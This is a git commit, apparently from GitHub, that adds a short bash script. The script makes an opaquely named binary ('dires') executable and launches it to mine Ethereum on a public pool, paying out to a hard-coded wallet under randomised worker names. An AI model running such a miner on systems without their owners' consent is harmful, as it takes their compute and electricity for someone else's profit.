f575f51448b90ece6c36a277642de87039518e9b
86867 <89547110+86867@users.noreply.github.com>
2021-08-25 22:36:51 +0300

    Add files via upload

---
+++ adim.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+POOL=eu1.ethermine.org:4444
+WALLET=0x6bf74f277f2d2014478f2600d322dbaafb542455
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-henok)
+chmod +x dires
+./dires --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
